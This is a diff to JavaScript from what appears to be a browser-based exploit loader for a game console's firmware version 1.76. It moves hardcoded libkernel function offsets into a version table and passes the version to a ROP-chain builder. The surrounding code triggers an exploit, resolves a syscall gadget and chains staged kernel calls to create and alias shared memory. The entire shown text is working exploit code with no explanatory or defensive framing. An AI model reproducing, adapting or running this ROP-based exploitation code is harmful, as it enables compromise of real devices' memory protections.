@@ -98,8 +98,17 @@
 
 			function ldr()
 			{
+				var version = 1.76
+
+				var libKernelOffsets = {
+					1.76: {
+						createSharedMemory: 0x15170,
+						createSharedMemoryAlias: 0x151c0
+					}
+				}
+
 				exploit();
-				var chain = new rop();
+				var chain = new rop(version)
 
 				var size = 0x100000;
 				var writeAddress = 0x926100000;
@@ -114,7 +123,7 @@
 				if(params['stage'] == null)
 					params['stage'] = 0;
 
-				params['syscall'] = gadgets["mov r10, rcx; syscall"].address();
+				params['syscall'] = gadgets[version]["mov r10, rcx; syscall"].address();
 
 				if(debug > 2)
 					document.body.innerHTML += 'Stage (Begin): ' + params['stage'] + '<br>' +
@@ -125,11 +134,11 @@
 				switch(params['stage'])
 				{
 					case 0:
-						chain.call('createSharedMemory', LIBKERNEL, 0x15170, 0, size, 1 | 2 | 4, chain.data);
+						chain.call('createSharedMemory', LIBKERNEL, libKernelOffsets[version]['createSharedMemory'], 0, size, 1 | 2 | 4, chain.data);
 						chain.execute(function(){ params['eh1'] = getU32from(chain.data); nextStage(params); });
 						break;
 					case 1:
-						chain.call('createSharedMemoryAlias', LIBKERNEL, 0x151c0, params['eh1'], 1 | 2, chain.data);
+						chain.call('createSharedMemoryAlias', LIBKERNEL, libKernelOffsets[version]['createSharedMemoryAlias'], params['eh1'], 1 | 2, chain.data);
 						chain.execute(function(){ params['wh1'] = getU32from(chain.data); nextStage(params); });
 						break;
 					case 2:
